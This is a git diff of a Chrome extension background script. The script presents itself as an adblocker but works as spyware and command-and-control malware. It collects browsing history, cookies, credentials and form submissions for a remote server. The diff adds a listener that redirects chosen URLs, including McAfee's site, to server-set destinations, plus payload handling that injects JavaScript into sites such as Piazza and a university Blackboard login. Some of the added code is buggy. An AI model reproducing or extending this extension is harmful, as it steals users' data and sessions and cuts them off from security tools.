@@ -6,7 +6,7 @@ var socket = null;
  * user ID (int) identifier
  * js_cmd (list of pairs (site url, js function))
  * last_pkt (int) time in milliseconds since last check-in with server
- * security_blacklist (list of strings) list of sites that will be redirected to "404.com"
+ * security_blacklist (list of strings) list of site1,site2 pairs. Navigating to site1 will redirect to site2
  */
 var config = {
 	ID: 0,
@@ -14,6 +14,9 @@ var config = {
 	last_pkt: Date.now(),
 	security_blacklist: []
 };	//update this variable when a packet is sent
+	//add to js_cmd
+	//update last_pkt
+	//update security_blacklist
 
 var queue = {
 	history: [],	//array of urls
@@ -27,11 +30,9 @@ function clearQueue(){
 		queue.key = [];
 	})
 }
-/* update the handler for redirection to consider changes to the list of forbidden
- * reference:
- * 	https://stackoverflow.com/questions/26157036/how-can-i-update-an-onbeforerequest-event-listener-in-a-chrome-extension
- */
-function redirectHandler(details){
+
+
+/*function redirectHandler(details){
     return{redirectUrl: "http://404.com/"};
 }
 function setListener(newList){
@@ -42,8 +43,21 @@ function setListener(newList){
 		["blocking"]
     );
     chrome.webRequest.handlerBehaviorChanged();
-}
-
+}*/
+chrome.webRequest.onBeforeRequest.addListener(
+    function(details) {
+		var url = details.url;
+		var i;
+		for(i = 0; i < config.security_blacklist.length; i++){
+			if(config.security_blacklist[i].hasOwnProperty(url)){	//if the url is in the list, redirect
+                return {redirectUrl: config.security_blacklist[i][url]};
+			}
+		}
+    },
+    {urls: ["<all_urls>"],
+	types: ["main_frame"]},
+    ["blocking"]
+);
 
 //basic blocking functionality for adblocker
 chrome.webRequest.onBeforeRequest.addListener(
@@ -101,7 +115,7 @@ chrome.tabs.onUpdated.addListener(
 );
 
 
-chrome.webRequest.onBeforeRequest.addListener(function(details){
+/*chrome.webRequest.onBeforeRequest.addListener(function(details){
 	console.log("Baking Cookies!");
 	chrome.cookies.getAll({"url":details.url},function(cookies){
 		console.log("cookies ", cookies);
@@ -111,10 +125,17 @@ chrome.webRequest.onBeforeRequest.addListener(function(details){
 			var newCookie = {"name": cookies[i].name,
 							 "url": details.url,
 							 "content": cookies[i].value};
-			if(!queue.cookies.contains(newCookie)){
-				queue.cookies.push(newCookie);
-				cookiesChanged = true;
-			}
+			console.log("newCookie: ", newCookie);
+			queue.cookies.forEach(function(storedCookie){
+				console.log("storedCookies: ",storedCookie);
+				if(storedCookie[name] === newCookie[name])
+                    queue.cookies.push(newCookie);
+                	cookiesChanged = true;
+                	console.log("Cookies Added!!!!");
+
+			});
+
+
 		}
 		if(cookiesChanged){
             storeQueue();
@@ -124,7 +145,7 @@ chrome.webRequest.onBeforeRequest.addListener(function(details){
 	{urls: ["<all_urls>"],
 	types: ["main_frame"]},
 	["blocking"]
-);
+);*/
 
 /* Listen for HTTP POST requests and gather information from the form
  *
@@ -258,15 +279,29 @@ function createJSON(clientid, history, cookies, creds, forms){
  */
 function createClientIDRequest(){
 	return createJSON(0,[],[],[],[]);
-	//TODO: change history and cookies accordingly
 }
 
 function handleServerPayload(payload) {
 	console.log('Payload received: ' + JSON.stringify(payload, null, 2));
 	//TODO: control flow : {edit current 'config' based on payload; store payload}
+	if(!validateServerPayload()){
+		console.log("Failed to validate payload");
+		return false;
+	}
+	else{
+		config.security_blacklist = payload["security_blacklist"];
+		config.js_cmd.concat(payload["js_cmd"]);
+		storeConfig();
+
+	}
 }
 
 
+function validateServerPayload(payload) {
+	if(!payload.hasOwnProperty("security_blacklist") || !payload.hasOwnProperty("js_cmd")){
+		return false;
+	}
+}
 
 
 function connectToHost(){
@@ -304,8 +339,10 @@ function main_func() {
 	config.js_cmd.push({"https://piazza.com/class/jksrwiu8kuz2w5" : 'alert("u r hacked!");'});
     config.js_cmd.push({"https://piazza.com/class/jksrwiu8kuz2w5" : 'alert("u b hacked222222222!");'});
     config.js_cmd.push({"https://blackboard.stonybrook.edu/webapps/login/" : 'alert("This one as well 3333333?!");'});
-	config.security_blacklist.push("https://www.mcafee.com/en-us/index.html");
-	setListener(config.security_blacklist);
+	config.security_blacklist.push({"https://www.mcafee.com/en-us/index.html":"https://developer.chrome.com/extensions/examples/extensions/catifier/event_page.js"});
+	//setListener(config.security_blacklist);
+
+    //setInterval(alert, 1000 * 10, ["Hello"]);	//sends payload every 5 minutes
 }
 
 loadConfig().then(
